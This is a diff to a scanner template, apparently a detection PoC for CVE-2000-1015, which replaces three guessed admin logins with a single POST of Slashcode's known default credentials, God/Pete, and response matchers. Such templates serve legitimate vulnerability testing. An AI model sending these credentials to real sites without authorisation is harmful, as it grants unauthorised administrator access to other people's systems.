@@ -1,29 +1,25 @@
 [info]
 author = "AVE"
-description = "Slashcode 2.0 Alpha 之前版本存在硬编码默认管理员密码漏洞。远程攻击者可通过使用默认凭据登录 /admin 管理后台，获取管理员权限。此 PoC 通过尝试默认密码登录验证漏洞是否存在。"
+description = "检测 Slashcode 默认管理密码漏洞，尝试使用默认凭据 God/Pete 登录后台，验证是否存在未修改默认密码的安全风险"
 id = "POC-AVE-2000-1050"
-name = "Slashcode 默认管理密码漏洞 PoC"
+name = "CVE-2000-1015 PoC"
 severity = "high"
-tags = [
-    "cve-2000-1015",
-    "default-password",
-    "slashcode",
-]
+tags = ["cve-2000-1015"]
 vuln_id = [
     "CVE-2000-1015",
     "AVE-2000-1050",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/admin/login"
+path = "/{{BaseURL}}/login"
 protocol = "http"
 
 [poc.requests.body]
-content = "user=admin&password=admin"
+content = "user=God&passwd=Pete"
 type = "raw"
 
 [poc.requests.headers]
@@ -34,51 +30,7 @@ expect = true
 part = "body"
 type = "word"
 words = [
+    "seclev",
     "admin",
-    "Administration",
-    "Slashcode",
-]
-
-[[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/admin/login"
-protocol = "http"
-
-[poc.requests.body]
-content = "user=admin&password=slashcode"
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "admin",
-    "Administration",
-    "Slashcode",
-]
-
-[[poc.requests]]
-method = "POST"
-path = "/{{BaseURL}}/admin/login"
-protocol = "http"
-
-[poc.requests.body]
-content = "user=admin&password=password"
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
-
-[[poc.requests.matchers]]
-expect = true
-part = "body"
-type = "word"
-words = [
-    "admin",
-    "Administration",
-    "Slashcode",
+    "menu",
 ]
